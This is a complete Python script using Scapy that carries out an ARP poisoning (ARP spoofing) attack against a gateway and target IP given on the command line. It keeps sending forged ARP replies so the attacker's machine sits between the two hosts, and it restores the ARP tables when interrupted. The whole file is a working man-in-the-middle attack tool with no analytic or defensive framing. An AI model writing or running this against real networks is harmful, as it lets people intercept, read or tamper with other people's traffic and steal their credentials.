import sys

from scapy.all import *
from time import sleep

conf.verb = 0
conf.iface = "enp5s0"

broadcast = "ff:ff:ff:ff:ff:ff"

def getmac(ip_address):
    """Return the MAC address"""

    response, unanswered = srp(Ether(dst=broadcast)/ARP(pdst=ip_address),
        timeout=2, retry=10)

    for sender, responder in response:
        return responder[Ether].hwsrc

    print("[-] Failed to get the MAC of %s" % ip_address)
    sys.exit(1)

def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    """Restore gateway's and target's MAC tables"""

    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
        hwdst=broadcast, hwsrc=gateway_mac), count=5)

    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
        hwdst=broadcast, hwsrc=target_mac), count=5)

    print("[*] Network restored")

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """Change gateway's and target's MAC tables"""

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    try:
        print("[*] Begining ARP poisoning press [CTRL-C] to stop")
        while True:
            send(poison_target)
            send(poison_gateway)
            sleep(2)
    except KeyboardInterrupt:
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] ARP poison attack finished.")

    return

def main(argc, argv):
    
    if argc != 3:
        print("Usage: %s <GatewayIP>  <TargetIP>"  % argv[0])
        sys.exit(1)

    gateway_ip, target_ip = argv[1:]
    gateway_mac = getmac(gateway_ip)
    target_mac = getmac(target_ip)

    poison_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)

if __name__ == '__main__':
    main(len(sys.argv), sys.argv)